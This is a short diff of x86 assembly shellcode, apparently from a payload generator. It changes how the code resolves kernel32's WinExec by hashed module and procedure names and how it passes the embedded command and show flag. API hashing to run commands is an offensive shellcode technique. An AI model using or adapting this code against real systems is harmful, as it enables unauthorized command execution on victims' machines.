@@ -14,21 +14,22 @@ entry:
 
   ; find "kernel32.dll, WinExec"
   cld                                   ; clear the direction flag
-  push 0x61DA2999                       ; set hash key
-  push 0x0AE20914                       ; set function hash
+  push 0x4D5AF344                       ; set module name hash
+  push 0xFB16D6BD                       ; set procedure name hash
+  push 0x21F98D89                       ; set hash key
   call find_api                         ; try to find api address
   test eax, eax                         ; check target function is found
   jz not_found                          ;
 
   ; call "kernel32.dll, WinExec"
-  lea edx, [ebx+command]                ; lpCmdLine
-  xor ecx, ecx                          ; clear ecx
-  mov cl, [ebx+cmd_show]                ; set uCmdShow
-  push ecx                              ; push uCmdShow
-  push edx                              ; push lpCmdLine
+  lea ecx, [ebx+command]                ; lpCmdLine
+  xor edx, edx                          ; clear ecx
+  mov dl, [ebx+cmd_show]                ; set uCmdShow
+  push edx                              ; push uCmdShow
+  push ecx                              ; push lpCmdLine
   call eax                              ; call api function
 
-  not_found:                            ;
+ not_found:
   ; restore context
   mov esp, ebp                          ; restore stack
   pop ebp                               ; restore ebp
